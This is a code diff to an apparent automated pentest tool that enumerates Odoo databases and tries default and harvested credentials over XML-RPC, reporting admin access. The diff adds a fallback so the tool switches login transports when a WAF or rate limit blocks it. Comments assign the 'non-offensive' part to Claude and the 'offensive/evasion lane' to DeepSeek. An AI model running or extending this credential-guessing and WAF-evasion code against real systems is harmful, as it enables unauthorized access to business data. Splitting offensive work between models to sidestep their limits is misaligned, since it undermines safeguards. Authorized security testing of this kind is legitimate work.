@@ -46,7 +46,8 @@ run() finding shape (on success):
 
 from __future__ import annotations
 
-from typing import Any
+import dataclasses
+from typing import Any, Protocol, runtime_checkable
 from urllib.parse import urlparse
 
 from defusedxml import ElementTree as DefusedET
@@ -68,6 +69,60 @@ ODOO_XMLRPC_DB_PATH = "/xmlrpc/2/db"
 # heuristic; no write or group-read performed — uid integer is the proof ceiling).
 # uid 1 = __import__ / superuser on older installs; uid 2 = canonical admin.
 _ODOO_ADMIN_UIDS: frozenset[int] = frozenset({1, 2})
+
+# HTTP statuses that mean the ENDPOINT ITSELF was blocked (WAF/CDN/rate-limit), NOT an
+# auth failure — the GAP-067 trigger to fall back to the next transport. A 200 carrying a
+# wrong credential or an XML-RPC fault is NOT blocked (the endpoint answered) — no fallback.
+_ODOO_BLOCK_STATUSES: frozenset[int] = frozenset({403, 429, 503})
+
+
+@dataclasses.dataclass(frozen=True)
+class OdooLoginResult:
+    """Outcome of ONE credential against ONE Odoo transport.
+
+    ``uid`` is a verified Odoo user id (>0) or None. ``blocked`` is True ONLY when the
+    transport ENDPOINT was blocked (WAF/CDN/unreachable) — the signal to fall back to the
+    next transport; a wrong credential (endpoint answered, uid absent) is blocked=False.
+    """
+
+    uid: int | None
+    blocked: bool
+    requests_used: int
+
+
+@runtime_checkable
+class OdooTransport(Protocol):
+    """Validates credentials against an Odoo app over ONE wire protocol.
+
+    GAP-067 fallback seam: XML-RPC (``/xmlrpc/2/*``) is frequently WAF-blocked while the
+    web JSON-RPC login (``/web/session/authenticate``) is allowed. OdooAccessTool tries
+    transports in order and falls back when one reports ``blocked``. Claude owns this
+    protocol + the XML-RPC transport (behaviour-preserving extraction of the existing
+    body); the JSON-RPC transport BODY is the offensive/evasion lane (DeepSeek), authored
+    separately against this contract.
+    """
+
+    name: str  # "xmlrpc" | "json_rpc"
+    auth_endpoint: str  # path recorded in the finding's proof_request (distinguishes transport)
+
+    def discover_databases(
+        self, base_url: str, max_reqs: int, requests_used: int
+    ) -> tuple[list[str], str, bool, int]:
+        """Return (db_names, db_source, blocked, requests_used). db_source is
+        "enumerated" | "guessed"; blocked=True means try the next transport."""
+        ...
+
+    def server_version(
+        self, base_url: str, max_reqs: int, requests_used: int
+    ) -> tuple[str | None, int]:
+        """Non-destructive server version for proof_response (or None)."""
+        ...
+
+    def authenticate(
+        self, base_url: str, db: str, login: str, password: str, requests_used: int
+    ) -> OdooLoginResult:
+        """Validate (login, password) against db; verify on a real integer uid (>0)."""
+        ...
 
 
 def _is_odoo(ctx: TargetContext) -> bool:
@@ -99,12 +154,17 @@ class OdooAccessTool:
         http_client: Any = None,
         graph_store: Any = None,
         secrets_manager: Any = None,
+        transports: list[OdooTransport] | None = None,
     ) -> None:
         # Injected so run() can reach the wire + resolve reused creds. None is allowed
         # for applies_to()/conformance use; run() requires a real http_client.
         self._http_client = http_client
         self._graph_store = graph_store
         self._secrets_manager = secrets_manager
+        # GAP-067 transport fallback chain. None → the default XML-RPC-only chain, built in
+        # run() once http_client is validated. The JSON-RPC transport is appended here once
+        # its (DeepSeek-authored) body lands — never half-scaffolded as a raising stub (#2).
+        self._transports = transports
 
     def applies_to(self, ctx: TargetContext) -> float:
         """Relevance 0..1 from context — the registry ranks, the agent never guesses
@@ -144,111 +204,88 @@ class OdooAccessTool:
             raise ValueError("OdooAccessTool.run requires an injected http_client")
 
         base_url = ctx.target.rstrip("/")
-        requests_used = 0
+        candidates = self._assemble_candidates()
+        # GAP-067: try each transport in order; fall back to the next when one is BLOCKED
+        # (WAF/CDN at the endpoint), NOT when a credential is simply wrong. Default chain is
+        # XML-RPC only; JSON-RPC joins it in __init__ once its DeepSeek body lands.
+        transports = self._transports or [XmlRpcOdooTransport(self._http_client)]
 
-        # ── 1. DISCOVER database via XML-RPC db.list() ─────────────
-        db_names, db_source, requests_used = self._discover_databases(
-            base_url, budget.max_requests, requests_used
-        )
-        if not db_names:
-            return ToolResult(
-                tool=self.name,
-                success=False,
-                confidence=0.0,
-                error="could not discover any Odoo database name",
+        requests_used = 0
+        any_db_resolved = False
+        any_blocked = False
+        for transport in transports:
+            db_names, db_source, blocked, requests_used = transport.discover_databases(
+                base_url, budget.max_requests, requests_used
+            )
+            if blocked:
+                any_blocked = True
+                continue  # endpoint blocked at discovery — fall back to the next transport
+            if not db_names:
+                continue  # reached the endpoint but resolved no database — next transport
+            any_db_resolved = True
+
+            server_version, requests_used = transport.server_version(
+                base_url, budget.max_requests, requests_used
             )
 
-        # ── 2. ASSEMBLE candidate credentials ──────────────────────
-        candidates = self._assemble_candidates()
-
-        # ── 3. FETCH server version (non-destructive, for proof) ───
-        auth_url = f"{base_url}{ODOO_XMLRPC_COMMON_PATH}"
-        server_version, requests_used = self._fetch_server_version(
-            auth_url,
-            budget.max_requests,
-            requests_used,
-        )
-
-        # ── 4. APPLY each credential via XML-RPC authenticate ──────
-        for db_name in db_names:
-            for username, password, cred_source, cred_node_id in candidates:
-                if requests_used >= budget.max_requests:
+            transport_blocked = False
+            for db_name in db_names:
+                if transport_blocked:
                     break
-
-                uid, requests_used = self._try_authenticate(
-                    auth_url,
-                    db_name,
-                    username,
-                    password,
-                    requests_used,
-                )
-                if uid is None:
-                    continue
-
-                access_level = "admin" if uid in _ODOO_ADMIN_UIDS else "user"
-                return ToolResult(
-                    tool=self.name,
-                    success=True,
-                    confidence=0.9,
-                    findings=(
-                        self._build_finding(
-                            db_name,
-                            username,
-                            uid,
-                            access_level,
-                            cred_source,
-                            cred_node_id,
-                            server_version,
-                            db_source,
+                for username, password, cred_source, cred_node_id in candidates:
+                    if requests_used >= budget.max_requests:
+                        break
+                    result = transport.authenticate(
+                        base_url, db_name, username, password, requests_used
+                    )
+                    requests_used = result.requests_used
+                    if result.blocked:
+                        any_blocked = True
+                        transport_blocked = True  # endpoint blocked mid-loop → next transport
+                        break
+                    if result.uid is None:
+                        continue  # wrong credential — try the next candidate
+                    access_level = "admin" if result.uid in _ODOO_ADMIN_UIDS else "user"
+                    return ToolResult(
+                        tool=self.name,
+                        success=True,
+                        confidence=0.9,
+                        findings=(
+                            self._build_finding(
+                                db_name,
+                                username,
+                                result.uid,
+                                access_level,
+                                cred_source,
+                                cred_node_id,
+                                server_version,
+                                db_source,
+                                transport.auth_endpoint,
+                            ),
                         ),
-                    ),
-                )
+                    )
 
+            # This transport reached its auth endpoint and exhausted every candidate
+            # WITHOUT a block → the credentials are wrong on a REACHABLE endpoint. Another
+            # transport (same candidates) would fail identically, so do NOT fall back —
+            # falling back here would double the request + lockout budget for nothing.
+            # Fallback is ONLY for an endpoint BLOCK (WAF/CDN), handled by `continue` above.
+            if not transport_blocked:
+                break
+
+        if not any_db_resolved:
+            reason = (
+                "all Odoo transports blocked before a database could be resolved"
+                if any_blocked
+                else "could not discover any Odoo database name"
+            )
+            return ToolResult(tool=self.name, success=False, confidence=0.0, error=reason)
         return ToolResult(
             tool=self.name,
             success=False,
             confidence=0.0,
-            error="no candidate credential authenticated over XML-RPC",
+            error="no candidate credential authenticated on any Odoo transport",
         )
-
-    def _discover_databases(
-        self,
-        base_url: str,
-        max_reqs: int,
-        requests_used: int,
-    ) -> tuple[list[str], str, int]:
-        """Discover Odoo database names via XML-RPC db.list(), with host-label fallback.
-
-        Also reports PROVENANCE (anti-#3 honesty): "enumerated" when db.list() actually
-        returned names, "guessed" when we fell back to the hostname label. A guessed db
-        that authenticates is a WEAKER finding — downstream (Omega down-rank, 1d chain
-        gate) must not treat it like an enumerated one.
-        """
-        host = urlparse(base_url).hostname or base_url
-        db_names: list[str] = []
-        db_source = "enumerated"
-        if requests_used < max_reqs:
-            try:
-                resp = self._http_client.post(
-                    f"{base_url}{ODOO_XMLRPC_DB_PATH}",
-                    data=_build_xmlrpc_request("list", []),
-                    headers={"Content-Type": "text/xml"},
-                )
-                requests_used += 1
-                if getattr(resp, "status_code", 0) == 200:
-                    parsed = _parse_xmlrpc_response(getattr(resp, "text", ""))
-                    if isinstance(parsed, list):
-                        db_names = [str(d) for d in parsed if str(d)]
-            except Exception:
-                pass
-
-        if not db_names:
-            db_source = "guessed"
-            derived = host.split(".")[0] if host else ""
-            if derived:
-                db_names = [derived]
-
-        return db_names, db_source, requests_used
 
     def _assemble_candidates(self) -> list[tuple[str, str, str, str | None]]:
         """Build credential candidate list: Odoo defaults + harvested graph creds.
@@ -284,60 +321,6 @@ class OdooAccessTool:
 
         return candidates
 
-    def _fetch_server_version(
-        self,
-        auth_url: str,
-        max_reqs: int,
-        requests_used: int,
-    ) -> tuple[str | None, int]:
-        """Fetch Odoo server version via XML-RPC (non-destructive, for proof_response)."""
-        if requests_used + 2 > max_reqs:
-            return None, requests_used
-
-        try:
-            resp = self._http_client.post(
-                auth_url,
-                data=_build_xmlrpc_request("version", []),
-                headers={"Content-Type": "text/xml"},
-            )
-            requests_used += 1
-            if getattr(resp, "status_code", 0) == 200:
-                parsed = _parse_xmlrpc_response(getattr(resp, "text", ""))
-                if isinstance(parsed, dict):
-                    return parsed.get("server_version"), requests_used
-        except Exception:
-            pass
-
-        return None, requests_used
-
-    def _try_authenticate(
-        self,
-        auth_url: str,
-        db: str,
-        login: str,
-        password: str,
-        requests_used: int,
-    ) -> tuple[int | None, int]:
-        """Attempt a single XML-RPC authenticate. Returns (uid | None, new_requests_used)."""
-        try:
-            resp = self._http_client.post(
-                auth_url,
-                data=_build_xmlrpc_request("authenticate", [db, login, password, {}]),
-                headers={"Content-Type": "text/xml"},
-            )
-            requests_used += 1
-        except Exception:
-            return None, requests_used
-
-        if getattr(resp, "status_code", 0) != 200:
-            return None, requests_used
-
-        uid = _parse_xmlrpc_response(getattr(resp, "text", ""))
-        if not isinstance(uid, int) or uid <= 0:
-            return None, requests_used
-
-        return uid, requests_used
-
     @staticmethod
     def _build_finding(
         db_name: str,
@@ -348,6 +331,7 @@ class OdooAccessTool:
         cred_node_id: str | None,
         server_version: str | None,
         db_source: str,
+        auth_endpoint: str,
     ) -> dict[str, Any]:
         """Build the finding dict — raw password intentionally absent.
 
@@ -363,7 +347,7 @@ class OdooAccessTool:
             "credential_source": cred_source,
             "credential_node_id": cred_node_id,
             "proof_request": {
-                "endpoint": ODOO_XMLRPC_COMMON_PATH,
+                "endpoint": auth_endpoint,
                 "method": "authenticate",
                 "database": db_name,
                 "database_source": db_source,
@@ -483,3 +467,113 @@ def _xml_to_value(elem: DefusedET.Element) -> Any:
         return int(text)
     except ValueError:
         return text
+
+
+# ── Transports (GAP-067 fallback chain) ───────────────────────────────────
+
+
+class XmlRpcOdooTransport:
+    """Validate Odoo credentials over XML-RPC (``/xmlrpc/2/*``).
+
+    Behaviour-preserving EXTRACTION of OdooAccessTool's original inline XML-RPC body
+    (Claude lane, non-offensive) into the OdooTransport seam, PLUS the ``blocked`` signal:
+    a WAF/CDN block status on the endpoint (403/429/503) now reports ``blocked`` so the
+    tool falls back to another transport, instead of being indistinguishable from a wrong
+    credential. A 200 (even an XML-RPC fault) is NOT blocked — the endpoint answered.
+    """
+
+    name = "xmlrpc"
+    auth_endpoint = ODOO_XMLRPC_COMMON_PATH
+
+    def __init__(self, http_client: Any) -> None:
+        self._http = http_client
+
+    def discover_databases(
+        self, base_url: str, max_reqs: int, requests_used: int
+    ) -> tuple[list[str], str, bool, int]:
+        """db.list() over XML-RPC, with host-label fallback + provenance (anti-#3 honesty).
+
+        "enumerated" when db.list() returned names; "guessed" when we fell back to the
+        hostname label. A 403/429/503 at the endpoint returns blocked=True (no guess) so
+        the tool falls back; any other outcome keeps the resilient hostname fallback.
+        """
+        host = urlparse(base_url).hostname or base_url
+        db_names: list[str] = []
+        db_source = "enumerated"
+        if requests_used < max_reqs:
+            try:
+                resp = self._http.post(
+                    f"{base_url}{ODOO_XMLRPC_DB_PATH}",
+                    data=_build_xmlrpc_request("list", []),
+                    headers={"Content-Type": "text/xml"},
+                )
+                requests_used += 1
+                status = getattr(resp, "status_code", 0)
+                if status in _ODOO_BLOCK_STATUSES:
+                    return [], "", True, requests_used  # WAF-blocked → fall back, do not guess
+                if status == 200:
+                    parsed = _parse_xmlrpc_response(getattr(resp, "text", ""))
+                    if isinstance(parsed, list):
+                        db_names = [str(d) for d in parsed if str(d)]
+            except Exception:  # noqa: BLE001 — unreachable/parse error → resilient host fallback
+                pass
+
+        if not db_names:
+            db_source = "guessed"
+            derived = host.split(".")[0] if host else ""
+            if derived:
+                db_names = [derived]
+
+        return db_names, db_source, False, requests_used
+
+    def server_version(
+        self, base_url: str, max_reqs: int, requests_used: int
+    ) -> tuple[str | None, int]:
+        """Fetch Odoo server version via XML-RPC (non-destructive, for proof_response)."""
+        if requests_used + 2 > max_reqs:
+            return None, requests_used
+        try:
+            resp = self._http.post(
+                f"{base_url}{ODOO_XMLRPC_COMMON_PATH}",
+                data=_build_xmlrpc_request("version", []),
+                headers={"Content-Type": "text/xml"},
+            )
+            requests_used += 1
+            if getattr(resp, "status_code", 0) == 200:
+                parsed = _parse_xmlrpc_response(getattr(resp, "text", ""))
+                if isinstance(parsed, dict):
+                    return parsed.get("server_version"), requests_used
+        except Exception:  # noqa: BLE001 — version is best-effort proof; never fatal
+            pass
+        return None, requests_used
+
+    def authenticate(
+        self, base_url: str, db: str, login: str, password: str, requests_used: int
+    ) -> OdooLoginResult:
+        """One XML-RPC ``authenticate(db, login, password)`` — verify on a real uid (>0).
+
+        A 403/429/503 (or an unreachable endpoint) reports blocked=True so the tool falls
+        back to the next transport. A 200 that yields no positive uid is a wrong credential
+        (blocked=False) — keep trying candidates on THIS transport.
+        """
+        auth_url = f"{base_url}{ODOO_XMLRPC_COMMON_PATH}"
+        try:
+            resp = self._http.post(
+                auth_url,
+                data=_build_xmlrpc_request("authenticate", [db, login, password, {}]),
+                headers={"Content-Type": "text/xml"},
+            )
+            requests_used += 1
+        except Exception:  # noqa: BLE001 — endpoint unreachable = a transport-level block
+            return OdooLoginResult(uid=None, blocked=True, requests_used=requests_used)
+
+        status = getattr(resp, "status_code", 0)
+        if status in _ODOO_BLOCK_STATUSES:
+            return OdooLoginResult(uid=None, blocked=True, requests_used=requests_used)
+        if status != 200:
+            return OdooLoginResult(uid=None, blocked=False, requests_used=requests_used)
+
+        uid = _parse_xmlrpc_response(getattr(resp, "text", ""))
+        if not isinstance(uid, int) or uid <= 0:
+            return OdooLoginResult(uid=None, blocked=False, requests_used=requests_used)
+        return OdooLoginResult(uid=uid, blocked=False, requests_used=requests_used)
